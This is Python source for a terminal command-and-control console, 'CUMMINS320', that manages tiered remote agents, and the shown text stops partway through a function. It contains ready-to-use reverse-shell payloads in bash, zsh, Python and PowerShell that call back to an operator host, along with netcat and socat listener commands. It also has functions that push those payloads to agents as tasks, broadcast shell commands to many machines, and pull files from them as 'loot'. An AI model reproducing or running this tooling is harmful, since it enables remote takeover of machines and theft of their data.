"""CUMMINS320 — Distributed C2 Operator Console

Tier model:
  T0  Controller (this machine)  — full authority
  T1  Primary agents             — elevated, relay to T2
  T2  Sub-agents                 — under T1 jurisdiction

Syntax highlighting (live, as you type):
  Commands  →  bold blue        (#58a6ff)
  Flags     →  orange           (#f0883e)
  Paths     →  green (exists) / gray (not found)
  Agents    →  green            (#3fb950)
  Shells    →  purple           (#d2a8ff)
  Values    →  gold             (#e3b341)

Reverse shells: bash · bash2 · zsh · python · powershell
Chat: full-screen panel, also available via browser at /chat (mobile-friendly, no syntax)
"""

from __future__ import annotations

import asyncio
import base64
import os
import sys
from datetime import datetime, timezone
from io import StringIO
from pathlib import Path
from typing import Optional

import requests
from rich import box
from rich.console import Console as RichConsole
from rich.markup import escape
from rich.panel import Panel
from rich.syntax import Syntax
from rich.table import Table
from rich.text import Text
from rich.tree import Tree

from textual import events, work
from textual.app import App, ComposeResult
from textual.binding import Binding
from textual.containers import Container, Horizontal, Vertical
from textual.reactive import reactive
from textual.widgets import Footer, Input, RichLog, Static

# ── Config ────────────────────────────────────────────────────────────────────

C2_URL = os.getenv("C2_URL", "http://100.64.0.10:8080")
LHOST  = os.getenv("C2_LHOST", "100.64.0.10")
HANDLE = os.getenv("C2_HANDLE", os.getenv("USER", "operator"))

REVSHELL_TEMPLATES = {
    "bash":        "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
    "bash2":       "bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'",
    "zsh":         "zsh -c 'zmodload zsh/net/tcp && ztcp {lhost} {lport}; zsh >&$REPLY <&$REPLY 2>&$REPLY'",
    "python":      "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'",
    "powershell":  "$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length))-ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$e=(iex $d 2>&1|Out-String);$n=([text.encoding]::ASCII).GetBytes($e+'> ');$s.Write($n,0,$n.Length)}}",
    "ps":          "$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length))-ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$e=(iex $d 2>&1|Out-String);$n=([text.encoding]::ASCII).GetBytes($e+'> ');$s.Write($n,0,$n.Length)}}",
}

BANNER = (
    "[bold cyan] ██████╗██╗   ██╗███╗   ███╗███╗   ███╗██╗███╗   ██╗███████╗███████╗██████╗ ██████╗  ██████╗[/bold cyan]\n"
    "[bold cyan]██╔════╝██║   ██║████╗ ████║████╗ ████║██║████╗  ██║██╔════╝╚════██╗╚════██╗██╔═████╗██╔═████╗[/bold cyan]\n"
    "[bold cyan]██║     ██║   ██║██╔████╔██║██╔████╔██║██║██╔██╗ ██║███████╗    ██╔╝ █████╔╝██║██╔██║██║██╔██║[/bold cyan]\n"
    "[bold cyan]██║     ██║   ██║██║╚██╔╝██║██║╚██╔╝██║██║██║╚██╗██║╚════██║   ██╔╝██╔═══╝ ████╔╝██║████╔╝██║[/bold cyan]\n"
    "[bold cyan]╚██████╗╚██████╔╝██║ ╚═╝ ██║██║ ╚═╝ ██║██║██║ ╚████║███████║   ██║ ███████╗╚██████╔╝╚██████╔╝[/bold cyan]\n"
    "[bold cyan] ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝ ╚══════╝ ╚═════╝  ╚═════╝[/bold cyan]\n"
    "[dim]  Distributed C2  ·  Tailscale-encrypted  ·  T0→T1→T2 hierarchy  ·  type [bold]help[/bold][/dim]"
)


# ── Syntax Highlighter ────────────────────────────────────────────────────────

class CommandParser:
    """Token-level real-time syntax highlighter."""

    COMMANDS = {
        "agents", "mesh",
        "use", "tier", "promote", "demote",
        "shell", "broadcast", "broadcast-t1", "broadcast-t2",
        "task", "tasks", "kill",
        "revshell", "listen",
        "modules", "run", "snapshots", "diff",
        "upload", "download", "sync", "loot",
        "deploy", "repos",
        "adduser",
        "events",
        "tag", "note",
        "chat", "msg",
        "clear", "help", "exit", "quit",
    }

    SHELL_TYPES  = {"bash", "bash2", "zsh", "python", "powershell", "ps", "sh"}
    TIER_ARGS    = {"t1", "t2", "all"}
    PATH_STARTS  = ("/", "~", "./", "../")
    AGENT_CMDS   = {"use", "promote", "demote", "tag", "note", "revshell", "tier", "download", "loot"}

    @classmethod
    def _is_path(cls, tok: str) -> bool:
        return any(tok.startswith(p) for p in cls.PATH_STARTS)

    @classmethod
    def _path_style(cls, tok: str) -> str:
        try:
            if os.path.exists(str(Path(tok).expanduser())):
                return "bold #7ee787"    # green  — exists
        except Exception:
            pass
        return "#8b949e"                 # gray   — not found

    @classmethod
    def colorize(cls, raw: str) -> Text:
        if not raw:
            return Text()
        result = Text()
        tokens = cls._split(raw)
        cmd    = tokens[0][0].lower() if tokens else ""

        for i, (tok, spaces) in enumerate(tokens):
            if spaces:
                result.append(spaces)

            if i == 0:
                style = "bold #58a6ff" if tok.lower() in cls.COMMANDS else "bold red"
                result.append(tok, style=style)

            elif tok.startswith("--") or (tok.startswith("-") and len(tok) > 1 and not tok[1:].isdigit()):
                result.append(tok, style="#f0883e")          # flags — orange

            elif cls._is_path(tok):
                result.append(tok, style=cls._path_style(tok))

            elif i == 1 and cmd in cls.AGENT_CMDS:
                result.append(tok, style="#3fb950")          # agent ref — green

            elif tok.lower() in cls.SHELL_TYPES:
                result.append(tok, style="#d2a8ff")          # shell type — purple

            elif tok.lower() in cls.TIER_ARGS or (tok in ("0", "1", "2") and len(tok) == 1):
                result.append(tok, style="#ffa657")          # tier/broadcast target — orange

            else:
                result.append(tok, style="#e3b341")          # value — gold

        return result

    @classmethod
    def _split(cls, text: str) -> list[tuple[str, str]]:
        out, i = [], 0
        while i < len(text):
            sp = ""
            while i < len(text) and text[i] == " ":
                sp += " "; i += 1
            if i >= len(text):
                break
            tok = ""
            while i < len(text) and text[i] != " ":
                tok += text[i]; i += 1
            out.append((tok, sp))
        return out


# ── Reverse Shell Engine ──────────────────────────────────────────────────────

class RevShell:
    @staticmethod
    def generate(shell: str, lhost: str, lport: int) -> str:
        tmpl = REVSHELL_TEMPLATES.get(shell.lower(), "")
        return tmpl.format(lhost=lhost, lport=lport)

    @staticmethod
    def listener_cmds(lport: int) -> list[tuple[str, str]]:
        return [
            ("netcat",        f"nc -lvnp {lport}"),
            ("netcat+rlwrap", f"rlwrap nc -lvnp {lport}"),
            ("ncat",          f"ncat -lvnp {lport} --keep-open"),
            ("socat PTY",     f"socat TCP-LISTEN:{lport},reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane"),
        ]


# ── Textual CSS ───────────────────────────────────────────────────────────────

CSS = """
Screen {
    background: #0d1117;
    color: #c9d1d9;
    layout: vertical;
}

#banner {
    height: 8;
    background: #0d1117;
    border-bottom: solid #30363d;
    padding: 0 1;
}

#body {
    layout: horizontal;
    height: 1fr;
}

#agent-panel {
    width: 32;
    background: #161b22;
    border-right: solid #30363d;
    overflow-y: auto;
    padding: 0 1;
}

#output {
    width: 1fr;
    background: #0d1117;
    padding: 0 1;
}

#chat-panel {
    width: 1fr;
    background: #0d1117;
    padding: 0 1;
    display: none;
}

#input-area {
    height: 4;
    background: #161b22;
    border-top: solid #30363d;
    padding: 0 1;
}

#preview {
    height: 1;
    background: #0d1117;
    color: #c9d1d9;
    padding: 0 1;
}

#cmd-input {
    background: #0d1117;
    border: none;
    color: #c9d1d9;
    height: 3;
}

#cmd-input:focus {
    border: none;
}

#statusbar {
    height: 1;
    background: #1f6feb;
    color: white;
    padding: 0 1;
}
"""


# ── App ───────────────────────────────────────────────────────────────────────

class CUMMINS320(App):
    """CUMMINS320 Distributed C2 Operator Console"""

    DEFAULT_CSS = CSS

    BINDINGS = [
        Binding("ctrl+r",     "refresh",      "Refresh",    show=True),
        Binding("ctrl+l",     "clear",        "Clear",      show=True),
        Binding("ctrl+t",     "toggle_chat",  "Chat",       show=True),
        Binding("ctrl+a",     "show_agents",  "Agents",     show=True),
        Binding("ctrl+m",     "show_mesh",    "Mesh",       show=True),
        Binding("escape",     "deselect",     "Deselect",   show=False),
        Binding("ctrl+c",     "quit",         "Quit",       show=False),
    ]

    active_agent: reactive[Optional[dict]] = reactive(None)

    def __init__(self):
        super().__init__()
        self.c2         = C2_URL
        self._agents    = []
        self._history   = []
        self._hist_idx  = -1
        self._chat_mode = False
        self._chat_last = 0      # last seen chat message id

    # ── Layout ────────────────────────────────────────────────────────────────

    def compose(self) -> ComposeResult:
        yield Static(BANNER, id="banner")
        with Horizontal(id="body"):
            yield Static("", id="agent-panel")
            yield RichLog(id="output",     markup=True, highlight=True, wrap=True)
            yield RichLog(id="chat-panel", markup=True, highlight=False, wrap=True)
        with Container(id="input-area"):
            yield Static("", id="preview")
            yield Input(placeholder="command  ·  help for list  ❯", id="cmd-input")
        yield Static("", id="statusbar")

    def on_mount(self) -> None:
        self.query_one("#cmd-input", Input).focus()
        self._refresh_agents()
        self._update_status()
        self.set_interval(5.0, self._refresh_agents)
        self.set_interval(1.0, self._update_status)
        self.set_interval(3.0, self._poll_chat)

    # ── Input ─────────────────────────────────────────────────────────────────

    def on_input_changed(self, event: Input.Changed) -> None:
        highlighted = CommandParser.colorize(event.value)
        full = Text("  ❯ ", style="dim cyan") + highlighted
        self.query_one("#preview", Static).update(full)

    def on_input_submitted(self, event: Input.Submitted) -> None:
        raw = event.value.strip()
        event.input.value = ""
        self.query_one("#preview", Static).update("")
        if not raw:
            return
        self._history.append(raw)
        self._hist_idx = len(self._history)
        self._dispatch(raw)

    # ── Dispatch ──────────────────────────────────────────────────────────────

    def _dispatch(self, raw: str):
        out = self.query_one("#output", RichLog)
        out.write(Text.assemble(("\n  ❯ ", "dim cyan"), CommandParser.colorize(raw)))

        parts = raw.split(None, 3)
        cmd   = parts[0].lower() if parts else ""
        args  = parts[1:] if len(parts) > 1 else []

        HANDLERS = {
            "agents":        lambda: self._cmd_agents(),
            "mesh":          lambda: self._cmd_mesh(),
            "use":           lambda: self._cmd_use(args),
            "tier":          lambda: self._cmd_tier(args),
            "promote":       lambda: self._cmd_promote(args),
            "demote":        lambda: self._cmd_demote(args),
            "shell":         lambda: self._cmd_shell(args),
            "broadcast":     lambda: self._cmd_broadcast(raw, tier=None),
            "broadcast-t1":  lambda: self._cmd_broadcast(raw, tier=1),
            "broadcast-t2":  lambda: self._cmd_broadcast(raw, tier=2),
            "task":          lambda: self._cmd_task(args),
            "tasks":         lambda: self._cmd_tasks(args),
            "kill":          lambda: self._cmd_kill(args),
            "modules":       lambda: self._cmd_modules(),
            "run":           lambda: self._cmd_run(args),
            "snapshots":     lambda: self._cmd_snapshots(args),
            "diff":          lambda: self._cmd_diff(args),
            "revshell":      lambda: self._cmd_revshell(args),
            "listen":        lambda: self._cmd_listen(args),
            "upload":        lambda: self._cmd_upload(args),
            "download":      lambda: self._cmd_download(args),
            "sync":          lambda: self._cmd_sync(args),
            "loot":          lambda: self._cmd_loot(args),
            "deploy":        lambda: self._cmd_deploy(args),
            "repos":         lambda: self._cmd_repos(),
            "adduser":       lambda: self._cmd_adduser(args),
            "events":        lambda: self._cmd_events(args),
            "tag":           lambda: self._cmd_tag(args),
            "note":          lambda: self._cmd_note(args),
            "chat":          lambda: self._cmd_send_chat(args),
            "msg":           lambda: self._cmd_send_chat(args),
            "clear":         lambda: self.action_clear(),
            "help":          lambda: self._cmd_help(),
            "exit":          lambda: self.exit(),
            "quit":          lambda: self.exit(),
        }

        fn = HANDLERS.get(cmd)
        if fn:
            try:
                fn()
            except Exception as e:
                out.write(Text(f"  ✗  {e}", style="red"))
        elif self.active_agent:
            self._run_shell(raw)
        else:
            out.write(Text(f"  ⚠  Unknown: '{cmd}'  —  type help", style="yellow"))

    # ── API ───────────────────────────────────────────────────────────────────

    def _api(self, method: str, path: str, **kw) -> requests.Response:
        return requests.request(method, f"{self.c2}{path}", timeout=10, **kw)

    def _log(self, obj, style: str = ""):
        out = self.query_one("#output", RichLog)
        if isinstance(obj, str):
            out.write(Text(obj, style=style))
        else:
            out.write(obj)

    def _chat_log(self, obj):
        self.query_one("#chat-panel", RichLog).write(obj)

    # ── Agent Sidebar ─────────────────────────────────────────────────────────

    def _refresh_agents(self):
        try:
            self._agents = self._api("GET", "/api/agents").json()
        except Exception:
            self._agents = []
        self._render_agent_panel()

    def _render_agent_panel(self):
        panel = self.query_one("#agent-panel", Static)
        t = Table(
            box=box.SIMPLE, show_header=True, expand=True,
            header_style="bold #58a6ff", show_edge=False, padding=(0, 0),
        )
        t.add_column("",     width=2,  no_wrap=True)
        t.add_column("Host", min_width=11, no_wrap=True)
        t.add_column("T",    width=2,  justify="center")
        t.add_column("P",    width=5,  no_wrap=True)

        for a in self._agents:
            age = a.get("last_seen_s", 9999)
            dot, dcol = (
                ("●", "green")  if age < 15  else
                ("◑", "yellow") if age < 90  else
                ("○", "red")
            )
            tier = a.get("tier", 2)
            t_lbl, t_col = (
                ("T0", "red")    if tier == 0 else
                ("T1", "yellow") if tier == 1 else
                ("T2", "cyan")
            )
            priv = "[bold red]root[/bold red]" if a.get("is_root") else (a.get("username") or "")[:5]
            is_active = self.active_agent and self.active_agent.get("id") == a.get("id")
            host = ("▶ " if is_active else "  ") + a.get("hostname", "?")[:11]
            t.add_row(
                Text(dot, style=dcol),
                Text(host, style="bold #58a6ff" if is_active else "bold white"),
                Text(t_lbl, style=t_col),
                Text.from_markup(priv),
            )

        sio = StringIO()
        rc  = RichConsole(file=sio, width=30, no_color=False, highlight=False)
        rc.print(Text(f"AGENTS  {len(self._agents)}", style="bold #58a6ff"))
        rc.rule(style="#30363d")
        rc.print(t)
        panel.update(sio.getvalue())

    # ── Status Bar ────────────────────────────────────────────────────────────

    def _update_status(self):
        sb  = self.query_one("#statusbar", Static)
        ts  = datetime.now().strftime("%H:%M:%S")
        aa  = self.active_agent
        tgt = f"target:{aa['hostname']}(T{aa.get('tier',2)})" if aa else "no-target"
        online = len([a for a in self._agents if a.get("last_seen_s", 999) < 90])
        mode = "  [CHAT]" if self._chat_mode else ""
        sb.update(
            f" ● CUMMINS320  {C2_URL}  ·  {tgt}"
            f"  ·  agents:{online}/{len(self._agents)}  ·  {ts}{mode} "
        )

    # ── Chat Polling ──────────────────────────────────────────────────────────

    def _poll_chat(self):
        try:
            msgs = self._api("GET", f"/api/chat?limit=50").json()
            new  = [m for m in msgs if m["id"] > self._chat_last]
            for m in new:
                self._chat_last = max(self._chat_last, m["id"])
                ts  = str(m["created_at"])[11:16]
                me  = (m["author"] == HANDLE)
                col = "#58a6ff" if me else "#3fb950"
                self._chat_log(Text.assemble(
                    (f"  {ts} ", "dim"),
                    (f"{m['author']}", col),
                    (": ", "dim"),
                    (m["message"], "white" if me else "#e6edf3"),
                ))
                # Also show notification in output if not in chat mode
                if not self._chat_mode and new:
                    last = new[-1]
                    self._log(Text.assemble(
                        ("  💬 ", ""), (f"{last['author']}: ", "#3fb950"), (last["message"][:60], "dim"),
                    ))
        except Exception:
            pass

    # ── Actions ───────────────────────────────────────────────────────────────

    def action_refresh(self):
        self._refresh_agents()
        self._log("  ✓  Refreshed", "green")

    def action_clear(self):
        self.query_one("#output", RichLog).clear()

    def action_toggle_chat(self):
        self._chat_mode = not self._chat_mode
        out  = self.query_one("#output",     RichLog)
        chat = self.query_one("#chat-panel", RichLog)
        if self._chat_mode:
            out.display  = False
            chat.display = True
            chat.write(Text.assemble(
                ("─" * 40 + "\n", "dim"),
                ("  TEAM CHAT  ·  /chat on phone  ·  msg <text> to send\n", "bold #58a6ff"),
                ("─" * 40, "dim"),
            ))
        else:
            out.display  = True
            chat.display = False
        self._update_status()

    def action_show_agents(self):
        self._cmd_agents()

    def action_show_mesh(self):
        self._cmd_mesh()

    def action_deselect(self):
        self.active_agent = None
        self._render_agent_panel()
        self._log("  Target cleared", "dim")

    # ── Commands ──────────────────────────────────────────────────────────────

    def _cmd_agents(self):
        if not self._agents:
            self._log("  No agents.", "dim"); return
        t = Table(box=box.ROUNDED, border_style="dim #30363d",
                  header_style="bold #58a6ff", expand=True)
        t.add_column("",       width=2)
        t.add_column("ID",     style="dim",        width=8)
        t.add_column("Host",   style="bold white",  min_width=14)
        t.add_column("IP",     style="cyan",         width=16)
        t.add_column("Tier",   width=9,              justify="center")
        t.add_column("OS",     style="dim",          width=10)
        t.add_column("User",   style="green",         width=10)
        t.add_column("Seen",   width=8)
        t.add_column("Repo",   style="dim",          width=14)

        TIER_MARKUP = {
            0: "[bold red]T0-CTL[/bold red]",
            1: "[bold yellow]T1-PRI[/bold yellow]",
            2: "[cyan]T2-SUB[/cyan]",
        }
        for a in self._agents:
            age = a.get("last_seen_s", 9999)
            dot, dcol, acol = (
                ("●", "green",  "green")  if age < 15  else
                ("◑", "yellow", "yellow") if age < 90  else
                ("○", "red",    "red")
            )
            age_s = f"{age}s" if age < 3600 else f"{age//60}m"
            t.add_row(
                Text(dot, style=dcol),
                a.get("id", ""),
                a.get("hostname", "?"),
                a.get("tailscale_ip", ""),
                Text.from_markup(TIER_MARKUP.get(a.get("tier", 2), "[cyan]T2[/cyan]")),
                f"{a.get('os','?')}/{a.get('arch','?')}",
                "[bold red]root[/bold red]" if a.get("is_root") else a.get("username", "?"),
                Text(age_s, style=acol),
                f"{a.get('git_repo','')}@{a.get('git_version','')}" if a.get("git_repo") else "",
            )
        self._log(t)

    def _cmd_mesh(self):
        agents = self._agents or []
        tree   = Tree("[bold cyan]CUMMINS320[/bold cyan]  [dim](T0 — Controller)[/dim]")
        t1s = [a for a in agents if a.get("tier", 2) == 1]
        t2s = [a for a in agents if a.get("tier", 2) == 2]

        for a in t1s:
            age  = a.get("last_seen_s", 9999)
            dot  = "●" if age < 15 else "◑" if age < 90 else "○"
            priv = " [bold red]root[/bold red]" if a.get("is_root") else ""
            node = tree.add(
                f"[bold yellow]T1[/bold yellow]  {dot} [bold]{a['hostname']}[/bold]"
                f" [dim][{a['tailscale_ip']}]{priv}[/dim]"
            )
            for a2 in t2s:
                age2 = a2.get("last_seen_s", 9999)
                dot2 = "●" if age2 < 15 else "◑" if age2 < 90 else "○"
                node.add(
                    f"[cyan]T2[/cyan]  {dot2} {a2['hostname']}  "
                    f"[dim][{a2['tailscale_ip']}][/dim]"
                )

        if not t1s and t2s:
            for a2 in t2s:
                age2 = a2.get("last_seen_s", 9999)
                dot2 = "●" if age2 < 15 else "◑" if age2 < 90 else "○"
                tree.add(f"[cyan]T2[/cyan]  {dot2} {a2['hostname']}  [dim][{a2['tailscale_ip']}][/dim]")
        if not t1s and not t2s:
            tree.add("[dim]No agents — deploy agent.py to machines[/dim]")

        self._log(tree)

    def _cmd_use(self, args):
        if not args:
            self._log("  Usage: use <id|hostname>", "yellow"); return
        target = args[0]
        match  = next((a for a in self._agents
                       if a["id"] == target or a["hostname"] == target), None)
        if not match:
            self._log(f"  ✗  Agent '{target}' not found", "red"); return
        self.active_agent = match
        self._render_agent_panel()
        TIER_NAME = {0: "T0-Controller", 1: "T1-Primary", 2: "T2-SubAgent"}
        priv = " [bold red](root)[/bold red]" if match.get("is_root") else ""
        self._log(Text.from_markup(
            f"  ✓  Targeting [bold]{match['hostname']}[/bold] "
            f"[dim][{match['tailscale_ip']}]  "
            f"{TIER_NAME.get(match.get('tier', 2), 'T2')}[/dim]{priv}"
        ))

    def _cmd_tier(self, args):
        if len(args) < 2:
            self._log("  Usage: tier <agent> <0|1|2>", "yellow"); return
        try:
            tier = int(args[1]); assert tier in (0, 1, 2)
        except Exception:
            self._log("  ✗  Tier must be 0, 1, or 2", "red"); return
        resp = self._api("PATCH", f"/api/agents/{args[0]}", json={"tier": tier})
        if resp.ok:
            self._log(f"  ✓  {args[0]} → T{tier}", "green")
            self._refresh_agents()
        else:
            self._log(f"  ✗  {resp.status_code}", "red")

    def _cmd_promote(self, args):
        if not args: self._log("  Usage: promote <agent>", "yellow"); return
        self._cmd_tier([args[0], "1"])

    def _cmd_demote(self, args):
        if not args: self._log("  Usage: demote <agent>", "yellow"); return
        self._cmd_tier([args[0], "2"])

    def _cmd_shell(self, args):
        if not self.active_agent:
            self._log("  ⚠  No target — use: use <agent>", "yellow"); return
        cmd = " ".join(args)
        if not cmd: self._log("  Usage: shell <command>", "yellow"); return
        self._run_shell(cmd)

    def _run_shell(self, cmd: str):
        resp = self._api("POST", "/api/tasks",
                         json={"agent_id": self.active_agent["id"], "command": cmd})
        if resp.ok:
            tid = resp.json().get("id")
            self._log(f"  ✓  Task [bold]{tid}[/bold] queued — task {tid}", "green")
        else:
            self._log(f"  ✗  Failed: {resp.status_code}", "red")

    def _cmd_broadcast(self, raw: str, tier: Optional[int]):
        parts = raw.split(None, 1)
        cmd   = parts[1] if len(parts) > 1 else ""
        if not cmd:
            self._log("  Usage: broadcast <command>", "yellow"); return
        payload = {"command": cmd}
        if tier is not None:
            payload["tier"] = tier
        resp = self._api("POST", "/api/broadcast", json=payload)
        if resp.ok:
            data     = resp.json()
            tier_str = f"T{tier}" if tier is not None else "ALL"
            self._log(
                f"  ✓  Broadcast [{tier_str}] → {data.get('queued', 0)} agents  "
                f"tasks: {data.get('tasks', [])}",
                "green"
            )
        else:
            self._log(f"  ✗  Broadcast failed: {resp.status_code}", "red")

    def _cmd_task(self, args):
        if not args: self._log("  Usage: task <id>", "yellow"); return
        resp = self._api("GET", f"/api/tasks/{args[0]}")
        if resp.status_code == 404:
            self._log(f"  ✗  Task {args[0]} not found", "red"); return
        self._render_task(resp.json())

    def _render_task(self, t: dict):
        SC = {"complete":"green","failed":"red","pending":"yellow",
              "running":"cyan","cancelled":"dim","expired":"dim"}
        sc = SC.get(t.get("status", ""), "white")
        self._log(Panel(
            f"[bold white]{escape(t.get('command','')[:100])}[/bold white]\n"
            f"[dim]Agent: {t.get('agent_id')}  |  Type: {t.get('type')}  |  "
            f"Created: {str(t.get('created_at',''))[:16]}[/dim]",
            title=f"[bold]Task {t.get('id')}[/bold]  [{sc}]{t.get('status','').upper()}[/{sc}]",
            border_style=sc,
        ))
        if t.get("stdout"):
            self._log(Panel(
                Syntax(t["stdout"], "bash", theme="monokai", word_wrap=True),
                title="[green]STDOUT[/green]", border_style="green",
            ))
        if t.get("stderr"):
            self._log(Panel(t["stderr"], title="[red]STDERR[/red]", border_style="red"))
        if t.get("exit_code") is not None:
            ec = t["exit_code"]
            self._log(Text(f"  Exit {ec}", style="green" if ec == 0 else "red"))

    def _cmd_tasks(self, args):
        aid = args[0] if args else None
        url = f"/api/tasks?agent_id={aid}" if aid else "/api/tasks"
        try:
            tasks = self._api("GET", url).json()
        except Exception:
            tasks = []
        if not tasks:
            self._log("  No tasks.", "dim"); return
        t = Table(box=box.SIMPLE, header_style="bold #58a6ff",
                  border_style="dim", expand=True)
        t.add_column("ID",     style="dim",   width=10)
        t.add_column("Agent",  style="cyan",  width=10)
        t.add_column("Status", width=13)
        t.add_column("Type",   style="dim",   width=8)
        t.add_column("Cmd",    min_width=24)
        t.add_column("Exit",   justify="right", width=6)
        t.add_column("Created",style="dim",   width=16)
        SC = {"complete":"green","failed":"red","pending":"yellow","running":"cyan"}
        for tk in tasks:
            sc = SC.get(tk.get("status",""), "white")
            t.add_row(
                tk.get("id",""), tk.get("agent_id",""),
                Text(tk.get("status","").upper(), style=sc),
                tk.get("type",""), tk.get("command","")[:40],
                str(tk.get("exit_code","")) if tk.get("exit_code") is not None else "-",
                str(tk.get("created_at",""))[:16],
            )
        self._log(t)

    def _cmd_kill(self, args):
        if not args: self._log("  Usage: kill <task_id>", "yellow"); return
        resp = self._api("DELETE", f"/api/tasks/{args[0]}")
        if resp.ok:
            self._log(f"  ✓  Task {args[0]} cancelled", "green")
        else:
            self._log(f"  ✗  Cannot cancel: {resp.status_code}", "red")

    def _cmd_revshell(self, args):
        shell = args[0].lower() if args else "bash"
        lport = int(args[1]) if len(args) > 1 else 4444
        lhost = args[2] if len(args) > 2 else LHOST

        if shell not in REVSHELL_TEMPLATES:
            self._log(
                f"  ✗  Unknown shell '{shell}'\n"
                f"  Types: {', '.join(REVSHELL_TEMPLATES)}", "red"); return

        payload  = RevShell.generate(shell, lhost, lport)
        listener = RevShell.listener_cmds(lport)
        listener_txt = "\n".join(f"  [{n}]  [bold green]{c}[/bold green]" for n, c in listener)

        self._log(Panel(
            f"[bold white]Shell:[/bold white]   [#d2a8ff]{shell}[/#d2a8ff]  "
            f"[bold white]LHOST:[/bold white] [cyan]{lhost}[/cyan]  "
            f"[bold white]LPORT:[/bold white] [yellow]{lport}[/yellow]\n\n"
            f"[bold white]Payload:[/bold white]\n"
            f"  [dim]{escape(payload)}[/dim]\n\n"
            f"[bold white]Listeners:[/bold white]\n{listener_txt}\n\n"
            f"[dim]Upgrade shell after connection:\n"
            f"  python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n"
            f"  Ctrl+Z → stty raw -echo; fg[/dim]",
            title="[bold]Reverse Shell[/bold]", border_style="cyan",
        ))

        if self.active_agent:
            resp = self._api("POST", "/api/tasks",
                             json={"agent_id": self.active_agent["id"], "command": payload})
            if resp.ok:
                tid = resp.json().get("id")
                self._log(
                    f"  ✓  Payload dispatched to [bold]{self.active_agent['hostname']}[/bold]"
                    f"  task [bold]{tid}[/bold]\n"
                    f"  [dim]Start your listener before it fires:[/dim]\n"
                    f"  [bold green]{listener[1][1]}[/bold green]",
                )
            else:
                self._log("  ✗  Dispatch failed — start listener, send manually", "red")
        else:
            self._log("  ⚠  No target — payload shown only (use 'use <agent>')", "yellow")

    def _cmd_listen(self, args):
        lport = int(args[0]) if args else 4444
        cmds  = RevShell.listener_cmds(lport)
        lines = "\n".join(f"  [{n}]\n  [bold green]{c}[/bold green]\n" for n, c in cmds)
        self._log(Panel(
            f"[bold white]Port:[/bold white] [yellow]{lport}[/yellow]\n\n" + lines +
            "\n[dim]After connection — upgrade:[/dim]\n"
            "  python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n"
            "  [dim]Ctrl+Z → stty raw -echo; fg[/dim]",
            title="[bold]Listeners[/bold]", border_style="cyan",
        ))

    def _cmd_upload(self, args):
        if not self.active_agent or len(args) < 2:
            self._log("  Usage: upload <local_path> <remote_path>", "yellow"); return
        local = Path(args[0]).expanduser()
        if not local.exists():
            self._log(f"  ✗  File not found: {args[0]}", "red"); return
        data_b64 = base64.b64encode(local.read_bytes()).decode()
        resp = self._api("POST", "/api/tasks", json={
            "agent_id": self.active_agent["id"],
            "command":  f"file_upload:{args[1]}",
            "type":     "file_upload",
            "args":     {"path": args[1], "data_b64": data_b64},
        })
        if resp.ok:
            self._log(f"  ✓  Upload task {resp.json().get('id')} — {local.stat().st_size:,}B → {args[1]}", "green")
        else:
            self._log(f"  ✗  Upload failed: {resp.status_code}", "red")

    def _cmd_download(self, args):
        if not self.active_agent or not args:
            self._log("  Usage: download <remote_path>", "yellow"); return
        resp = self._api("POST", "/api/tasks", json={
            "agent_id": self.active_agent["id"],
            "command":  args[0],
            "type":     "file_download",
            "args":     {"path": args[0]},
        })
        if resp.ok:
            self._log(
                f"  ✓  Download task {resp.json().get('id')} — "
                f"loot {self.active_agent['id']} to view when complete",
                "green"
            )

    def _cmd_sync(self, args):
        if not args:
            self._log("  Usage: sync <local_file> [t1|t2|all]", "yellow"); return
        local = Path(args[0]).expanduser()
        if not local.exists():
            self._log(f"  ✗  Not found: {args[0]}", "red"); return
        tier_filter = args[1].lower() if len(args) > 1 else "all"
        tier_map    = {"t1": 1, "t2": 2, "all": None}
        tier        = tier_map.get(tier_filter)
        data_b64    = base64.b64encode(local.read_bytes()).decode()
        remote      = f"~/{local.name}"
        targets     = [a for a in self._agents if tier is None or a.get("tier", 2) == tier]
        for agent in targets:
            self._api("POST", "/api/tasks", json={
                "agent_id": agent["id"],
                "command":  f"file_upload:{remote}",
                "type":     "file_upload",
                "args":     {"path": remote, "data_b64": data_b64},
            })
        self._log(
            f"  ✓  Sync [bold]{args[0]}[/bold] → {len(targets)} agents "
            f"[{tier_filter.upper()}]  dest: {remote}",
            "green"
        )

    def _cmd_loot(self, args):
        aid = args[0] if args else (self.active_agent["id"] if self.active_agent else None)
        if not aid: self._log("  Usage: loot [agent_id]", "yellow"); return
        files = self._api("GET", f"/api/loot/{aid}").json()
        if not files:
            self._log(f"  No loot for {aid}", "dim"); return
        tree = Tree(f"[bold]Loot — {aid}[/bold]")
        for f in sorted(files, key=lambda x: x["modified"], reverse=True):
            size = f"{f['size']:,} B" if f["size"] < 1024 else f"{f['size']//1024:,} KB"
            tree.add(f"[cyan]{f['name']}[/cyan]  [dim]{size}[/dim]")
        self._log(tree)

    def _cmd_deploy(self, args):
        if not args: self._log("  Usage: deploy <repo> [agent|all]", "yellow"); return
        repo   = args[0]
        target = args[1] if len(args) > 1 else "all"
        params = {"branch": "main"}
        if target != "all":
            params["agent_id"] = target
        resp = self._api("POST", f"/api/deploy/{repo}", params=params)
        data = resp.json()
        self._log(
            f"  ✓  Deploy [bold]{repo}[/bold] → {data.get('deployed', 0)} agent(s)  "
            f"tasks: {data.get('tasks', [])}",
            "green"
        )

    def _cmd_repos(self):
        status = self._api("GET", "/api/repos/status").json()
        if not status: self._log("  No repos / Gitea unreachable", "dim"); return
        t = Table(box=box.SIMPLE, header_style="bold #58a6ff",
                  border_style="dim", expand=True)
        t.add_column("Repo",   style="bold white", min_width=16)
